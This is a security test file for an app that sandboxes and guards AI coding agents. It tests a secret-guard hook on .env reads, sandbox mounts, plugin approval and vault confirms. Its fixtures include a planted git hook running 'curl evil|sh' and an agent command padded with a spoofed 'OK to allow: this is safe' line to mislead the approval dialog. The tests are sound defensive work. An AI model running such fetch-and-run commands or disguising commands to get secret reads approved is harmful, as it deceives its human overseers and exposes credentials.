// Workbench Pro security fixes: sandbox mounts + env file, secret-guard hook, plugin approval,
// vault reveal confirm, guard "move keys" decision, safe ProjectFs writes, Safe Mode reload.
// The first group runs in plain Node (no Electron window); the second drives the real app.
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { execFileSync } = require('child_process');
const { test, expect, launchMeridian, closeMeridian, seedState, setDialogResponse, e2eLog, ROOT } = require('../fixtures/meridian');

const tmpDir = (p) => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), p)));
const HOOK = path.join(ROOT, 'src', 'dev', 'hooks', 'secret-guard-hook.js');

// Run the guard hook like Claude Code does (no Meridian socket in env -> it answers "ask" on a hit).
function runHook(ev) {
  const env = { ...process.env };
  delete env.MERIDIAN_GUARD_SOCKET;
  delete env.MERIDIAN_GUARD_TOKEN;
  const out = execFileSync(process.execPath, [HOOK], { input: JSON.stringify(ev), env, encoding: 'utf8' });
  return out ? JSON.parse(out).hookSpecificOutput.permissionDecision : null;
}

test.describe('workbench security (node)', () => {
  test('hook integrity hash in guard.js matches the shipped hook script', () => {
    const { SecretGuard } = require('../../src/dev/guard');
    const src = fs.readFileSync(path.join(ROOT, 'src', 'dev', 'guard.js'), 'utf8');
    const want = /HOOK_SHA256 = '([0-9a-f]{64})'/.exec(src)[1];
    expect(crypto.createHash('sha256').update(fs.readFileSync(HOOK)).digest('hex')).toBe(want);
    expect(new SecretGuard({ onRequest: async () => ({}) }).hookScript()).toEqual({ path: HOOK, error: null });
  });

  test('--settings keeps hooks on and guards every file-reading tool', () => {
    const { hookSettings } = require('../../src/dev/guard');
    const s = hookSettings('/usr/bin/node', '/opt/hook.js');
    expect(s.disableAllHooks).toBe(false);
    const tools = s.hooks.PreToolUse[0].matcher.split('|');
    for (const t of ['Read', 'Edit', 'MultiEdit', 'NotebookEdit', 'Grep', 'Glob', 'Bash', 'PowerShell']) expect(tools).toContain(t);
    expect(s.hooks.PreToolUse[0].matcher).toMatch(/^[a-zA-Z0-9_|]+$/); // Claude Code's exact-name matcher form
  });

  test('hook resolves symlinks and covers Edit / PowerShell', () => {
    const dir = tmpDir('mer-hook-');
    fs.writeFileSync(path.join(dir, '.env'), 'API_KEY=sk-live-123\n');
    fs.writeFileSync(path.join(dir, 'notes.txt'), 'hi\n');
    fs.symlinkSync(path.join(dir, '.env'), path.join(dir, 'harmless.txt'));
    const ev = (tool_name, tool_input) => ({ tool_name, tool_input, cwd: dir });
    expect(runHook(ev('Read', { file_path: 'notes.txt' }))).toBe(null);
    expect(runHook(ev('Read', { file_path: 'harmless.txt' }))).toBe('ask'); // symlink -> .env
    expect(runHook(ev('Edit', { file_path: '.env', old_string: 'a', new_string: 'b' }))).toBe('ask');
    expect(runHook(ev('PowerShell', { command: 'Get-Content .env' }))).toBe('ask');
    expect(runHook(ev('Grep', { pattern: 'KEY', path: 'harmless.txt' }))).toBe('ask');
    fs.rmSync(dir, { recursive: true, force: true });
  });

  test('guard socket: no umask change, socket is 0600 in a 0700 dir', async () => {
    const { SecretGuard } = require('../../src/dev/guard');
    const before = process.umask();
    const g = new SecretGuard({ onRequest: async () => ({ decision: 'deny' }) });
    await g.start();
    expect(process.umask()).toBe(before);
    expect(fs.statSync(g.socketPath).mode & 0o777).toBe(0o600);
    expect(fs.statSync(path.dirname(g.socketPath)).mode & 0o777).toBe(0o700);
    g.stop();
  });

  test('ProjectFs writes refuse symlinks that lead out, even swapped in at the last moment', async () => {
    const { ProjectFs } = require('../../src/dev/files');
    const base = tmpDir('mer-pfs-');
    const proj = path.join(base, 'p');
    fs.mkdirSync(proj);
    fs.writeFileSync(path.join(base, 'outside.txt'), 'OUTSIDE');
    fs.writeFileSync(path.join(proj, 'in.txt'), 'old');
    fs.symlinkSync(path.join(proj, 'in.txt'), path.join(proj, 'inner-link.txt'));
    fs.symlinkSync(path.join(base, 'outside.txt'), path.join(proj, 'out-link.txt'));
    fs.mkdirSync(path.join(base, 'outdir'));
    fs.symlinkSync(path.join(base, 'outdir'), path.join(proj, 'dirlink'));
    const p = new ProjectFs(proj);
    try {
      await p.write('in.txt', 'new');
      expect(fs.readFileSync(path.join(proj, 'in.txt'), 'utf8')).toBe('new');
      await p.write('inner-link.txt', 'via link'); // a symlink inside the project still works
      expect(fs.readFileSync(path.join(proj, 'in.txt'), 'utf8')).toBe('via link');
      await expect(p.write('out-link.txt', 'x')).rejects.toThrow(/outside the project/);
      await expect(p.write('dirlink/new.txt', 'x')).rejects.toThrow(/outside the project/);
      // the race itself: resolve() said "inside", then the parent dir becomes a symlink before the open
      const abs = path.join(proj, 'sub', 'f.txt');
      fs.mkdirSync(path.join(proj, 'sub'));
      fs.writeFileSync(abs, 'inside');
      fs.writeFileSync(path.join(base, 'outdir', 'f.txt'), 'victim');
      const realpath = fs.promises.realpath;
      let swapped = false;
      fs.promises.realpath = async (x) => {
        const r = await realpath(x);
        if (!swapped && x === abs) { swapped = true; fs.renameSync(path.join(proj, 'sub'), path.join(base, 'sub-moved')); fs.symlinkSync(path.join(base, 'outdir'), path.join(proj, 'sub')); }
        return r;
      };
      try { await expect(p.writeFileSafely(abs, 'pwned')).rejects.toThrow(/symlink|moved/); } finally { fs.promises.realpath = realpath; }
      expect(fs.readFileSync(path.join(base, 'outdir', 'f.txt'), 'utf8')).toBe('victim');
      expect(fs.readFileSync(path.join(base, 'outside.txt'), 'utf8')).toBe('OUTSIDE');
    } finally { p.dispose(); fs.rmSync(base, { recursive: true, force: true }); }
  });

  test('sandbox: host-run config is read-only, secrets go to a private file (not -e), risky roots are refused', async () => {
    const { Sandbox, autoExecSnapshot, snapshotDiff } = require('../../src/dev/sandbox');
    const base = tmpDir('mer-sbx-');
    const proj = path.join(base, 'proj');
    fs.mkdirSync(path.join(proj, '.git', 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(proj, '.git', 'config'), '[core]\n');
    fs.writeFileSync(path.join(proj, 'app.js'), '1');
    const sb = new Sandbox({ getEnv: async () => process.env, getSearchPath: async () => process.env.PATH });
    sb.status = async () => ({ installed: true, running: true, available: true, imagePresent: true, docker: '/usr/bin/docker', image: 'meridian-sandbox:test' });
    const before = await autoExecSnapshot(proj);
    const spec = await sb.launchSpec('sandbox-claude', { root: proj, secrets: { ANTHROPIC_API_KEY: 'sk-ant-SECRET=+/x', OTHER: 'v' }, forbiddenRoots: [path.join(base, 'userdata')] });
    try {
      const a = spec.args;
      expect(a.join(' ')).not.toContain('sk-ant-SECRET');
      expect(a.filter((x, i) => a[i - 1] === '-e')).toEqual(['TERM=xterm-256color', 'COLORTERM=truecolor']);
      const mounts = a.filter((x, i) => a[i - 1] === '--mount');
      for (const n of ['.git', '.claude', '.vscode', '.idea', '.husky', '.mcp.json', '.envrc']) expect(mounts).toContain(`type=bind,source=${path.join(proj, n)},target=/workspace/${n},readonly`);
      // missing ones got placeholders for the session
      expect(fs.statSync(path.join(proj, '.claude')).isDirectory()).toBe(true);
      expect(fs.existsSync(path.join(proj, '.mcp.json'))).toBe(true);
      const envMount = mounts.find((m) => m.includes('target=/run/meridian/env'));
      const envFile = /source=([^,]+)/.exec(envMount)[1];
      expect(envMount).toMatch(/,readonly$/);
      expect(fs.statSync(envFile).mode & 0o777).toBe(0o600);
      expect(fs.statSync(path.dirname(envFile)).mode & 0o777).toBe(0o700);
      const lines = fs.readFileSync(envFile, 'utf8').trim().split('\n');
      expect(lines.map((l) => l.split('=')[0])).toEqual(['ANTHROPIC_API_KEY', 'OTHER']);
      expect(Buffer.from(lines[0].slice(lines[0].indexOf('=') + 1), 'base64').toString()).toBe('sk-ant-SECRET=+/x');
      // a planted nested repo shows up in the review diff; the placeholders don't
      fs.mkdirSync(path.join(proj, 'vendor', 'lib', '.git', 'hooks'), { recursive: true });
      fs.writeFileSync(path.join(proj, 'vendor', 'lib', '.git', 'hooks', 'post-checkout'), '#!/bin/sh\ncurl evil|sh\n');
      expect(snapshotDiff(before, await autoExecSnapshot(proj))).toEqual([{ path: 'vendor/lib/.git', change: 'added' }]);
      spec.onExit();
      expect(fs.existsSync(envFile)).toBe(false);
      expect(fs.existsSync(path.join(proj, '.claude'))).toBe(false); // placeholders removed again
      expect(fs.existsSync(path.join(proj, '.mcp.json'))).toBe(false);
      expect(fs.existsSync(path.join(proj, '.git', 'config'))).toBe(true);
      // a protected entry that is a symlink refuses the launch (docker would mount its target)
      fs.symlinkSync(os.homedir(), path.join(proj, '.vscode'));
      await expect(sb.launchSpec('sandbox-shell', { root: proj })).rejects.toThrow(/symlink/);
      expect(fs.existsSync(path.join(proj, '.claude'))).toBe(false); // nothing left behind on refusal
      fs.unlinkSync(path.join(proj, '.vscode'));
      // Meridian's own data folder (plugins!) and the home folder are never mounted
      fs.mkdirSync(path.join(base, 'userdata', 'workbench-custom'), { recursive: true });
      await expect(sb.launchSpec('sandbox-shell', { root: path.join(base, 'userdata', 'workbench-custom'), forbiddenRoots: [path.join(base, 'userdata')] })).rejects.toThrow(/Meridian’s own data/);
      await expect(sb.launchSpec('sandbox-shell', { root: base, forbiddenRoots: [path.join(base, 'userdata')] })).rejects.toThrow(/Meridian’s own data/);
      await expect(sb.launchSpec('sandbox-shell', { root: fs.realpathSync(os.homedir()) })).rejects.toThrow(/home folder/);
    } finally { spec.onExit(); fs.rmSync(base, { recursive: true, force: true }); }
  });
});

// ------------------------------------------------------------------ in the app

const inWb = (page, code) => page.evaluate(([c]) => {
  const t = state.spaces.flatMap((s) => s.today).find((x) => x.kind === 'workbench');
  return rt.views.get(t.id).executeJavaScript(c);
}, [code]);

test.describe('workbench security (app)', () => {
  let project, launched, userData;

  test.beforeEach(async ({ userDataDir }) => {
    userData = userDataDir;
    project = path.join(tmpDir('mer-wbs-'), 'proj');
    fs.mkdirSync(project);
    fs.writeFileSync(path.join(project, 'hello.txt'), 'hello\n');
    fs.mkdirSync(path.join(userDataDir, 'workbench-custom', 'plugins'), { recursive: true });
    fs.writeFileSync(path.join(userDataDir, 'workbench-custom', 'plugins', 'tick.js'),
      "workbenchPlugin({ id: 'tick', name: 'Tick' }, () => { window.__tick = setInterval(() => { window.__ticks = (window.__ticks || 0) + 1; }, 50); });\n");
    launched = await launchMeridian({ userDataDir, state: seedState(), env: { MERIDIAN_TEST_PROJECT: project, MERIDIAN_TEST_KEYCHAIN: '1' } });
    await launched.page.evaluate(() => runCommand('open-project'));
    await expect.poll(() => inWb(launched.page, 'S.project && S.project.root').catch(() => null), { timeout: 15_000 }).toBe(project);
  });

  test.afterEach(async () => {
    await closeMeridian(launched?.app);
    try { fs.rmSync(path.dirname(project), { recursive: true, force: true }); } catch {}
  });

  test('plugins run only after a native approval of their exact content; Safe Mode reloads the page', async () => {
    test.setTimeout(90_000);
    const { page, app } = launched;
    const status = () => inWb(page, 'PRO.plugins.get("tick.js")?.status || null');
    const fetchPlugin = () => inWb(page, 'fetch("/custom/plugins/tick.js").then((r) => r.status)');
    await expect.poll(status).toBe('pending');
    expect(await fetchPlugin()).toBe(404);
    expect(await inWb(page, 'typeof window.__tick')).toBe('undefined');

    // "Don't run" (cancel) leaves it pending
    await inWb(page, 'approvePlugins().then(() => true)');
    let d = (await e2eLog(app)).dialogs.at(-1);
    expect(d.message).toMatch(/Run this Workbench plugin/);
    expect(d.detail).toContain('tick.js');
    expect(d.detail).toContain(path.join('workbench-custom', 'plugins', 'tick.js'));
    expect(d.detail).toMatch(/\d+ bytes/);
    expect(d.defaultId).toBe(0);
    expect(await status()).toBe('pending');

    await setDialogResponse(app, 1);
    await inWb(page, 'approvePlugins().then(() => true)');
    await expect.poll(status).toBe('active');
    expect(await fetchPlugin()).toBe(200);
    const approvals = JSON.parse(fs.readFileSync(path.join(userData, 'workbench-plugins-approved.json'), 'utf8'));
    expect(Object.keys(approvals.plugins)).toEqual(['tick.js']);
    await expect.poll(() => inWb(page, 'window.__ticks || 0')).toBeGreaterThan(0);

    // any change needs approval again (and the changed file isn't served meanwhile)
    await setDialogResponse(app, null);
    fs.appendFileSync(path.join(userData, 'workbench-custom', 'plugins', 'tick.js'), '// changed\n');
    await expect.poll(status, { timeout: 10_000 }).toBe('pending');
    expect(await fetchPlugin()).toBe(404);

    // Safe Mode reloads the page: the interval the plugin started is gone, the terminal survives
    await inWb(page, `launch('shell').then((t) => !!t)`);
    await expect.poll(() => inWb(page, 'S.terms.length')).toBe(1);
    await inWb(page, 'setSafeMode(true); true').catch(() => {});
    await expect.poll(() => inWb(page, 'typeof window.__tick').catch(() => 'reloading'), { timeout: 15_000 }).toBe('undefined');
    await expect.poll(() => inWb(page, 'S.terms.length').catch(() => -1), { timeout: 15_000 }).toBe(1);
    expect(await inWb(page, 'PRO.custom.safeMode')).toBe(true);
  });

  test('revealing a vault value takes a native confirm (Cancel is the default)', async () => {
    const { page, app } = launched;
    const id = await inWb(page, `window.workbench.vaultSet({ name: 'DEPLOY_TOKEN', value: 'tok-123', scope: 'project' }).then((r) => r.id)`);
    const reveal = () => inWb(page, `window.workbench.vaultReveal(${JSON.stringify(id)}).then((v) => v, (e) => 'refused: ' + e.message)`);
    expect(await reveal()).toMatch(/^refused: .*Not revealed/);
    const d = (await e2eLog(app)).dialogs.at(-1);
    expect(d.message).toContain('DEPLOY_TOKEN');
    expect(d.buttons[d.defaultId]).toBe('Cancel');
    await setDialogResponse(app, 1);
    expect(await reveal()).toBe('tok-123');
  });

  test('a sandbox is refused in the customization folder', async () => {
    const { page } = launched;
    await inWb(page, 'window.workbench.customOpen().then((p) => setProject(p)).then(() => true)');
    const res = await inWb(page, `window.workbench.ptyCreate({ kind: 'sandbox-shell', secrets: [] }).then(() => 'started', (e) => e.message)`);
    expect(res).toMatch(/Meridian’s own data/);
  });

  test('guard: "Move keys to vault" approves only reads of the migrated files; Block is the default; agent text is flattened', async () => {
    const { app } = launched;
    fs.writeFileSync(path.join(project, '.env'), 'PORT=3000\nSTRIPE_SECRET_KEY=sk_live_abcdefghijklmnop123456\n');
    fs.writeFileSync(path.join(project, 'notes.txt'), 'x');
    const decide = (req, response) => app.evaluate(async ({ BrowserWindow }, [root, request, resp]) => {
      global.__e2e.dialogResponse = resp;
      const req2 = process.mainModule.require;
      const { Workbench } = req2('./src/dev/index.js');
      const { ProjectFs } = req2('./src/dev/files.js');
      const vaultSet = [];
      const host = BrowserWindow.getAllWindows()[0].webContents;
      const fake = {
        dialogChain: Promise.resolve(), serialDialog: Workbench.prototype.serialDialog, migrateDotenv: Workbench.prototype.migrateDotenv,
        broadcast: () => {}, getMainWindow: () => BrowserWindow.getAllWindows()[0],
        vault: { namesFor: () => [], unavailableReason: () => null, set: (it) => vaultSet.push(it.name) },
      };
      const owner = { wc: { isDestroyed: () => false, hostWebContents: host }, project: new ProjectFs(root) };
      try {
        const out = await Workbench.prototype.guardDecision.call(fake, { owner, root, agent: 'Claude Code', allowed: new Set() }, request);
        return { ...out, vaultSet };
      } finally { owner.project.dispose(); global.__e2e.dialogResponse = null; }
    }, [project, req, response]);

    // Block is the default button; the agent's command is shown flattened on one line
    const evil = 'cat .env\n\n\nOK to allow: this is safe‮';
    const r0 = await decide({ tool: 'Bash', paths: [], command: evil }, null);
    expect(r0.decision).toBe('deny');
    let d = (await e2eLog(app)).dialogs.at(-1);
    expect(d.buttons[d.defaultId]).toBe('Block');
    expect(d.detail).toContain('Command requested by the agent:\n   cat .env OK to allow: this is safe');
    expect(d.detail).not.toContain('‮');

    // move keys for a command that also reads other things -> keys moved, call denied ("retry")
    const r1 = await decide({ tool: 'Bash', paths: [], command: 'cat .env notes.txt' }, 0);
    expect(r1.decision).toBe('deny');
    expect(r1.reason).toMatch(/moved to the Meridian vault.*retry/);
    expect(r1.vaultSet).toEqual(['STRIPE_SECRET_KEY']);
    expect(fs.readFileSync(path.join(project, '.env'), 'utf8')).toContain('STRIPE_SECRET_KEY=\n');

    // a plain Read of exactly the dotenv file -> allowed after the move
    fs.writeFileSync(path.join(project, '.env'), 'GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n');
    const r2 = await decide({ tool: 'Read', paths: [path.join(project, '.env')], command: null }, 0);
    expect(r2.decision).toBe('allow');
    // the same but together with another secret file -> denied
    fs.writeFileSync(path.join(project, '.env'), 'GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n');
    const r3 = await decide({ tool: 'Read', paths: [path.join(project, '.env'), path.join(project, 'id_rsa')], command: null }, 0);
    expect(r3.decision).toBe('deny');
  });
});
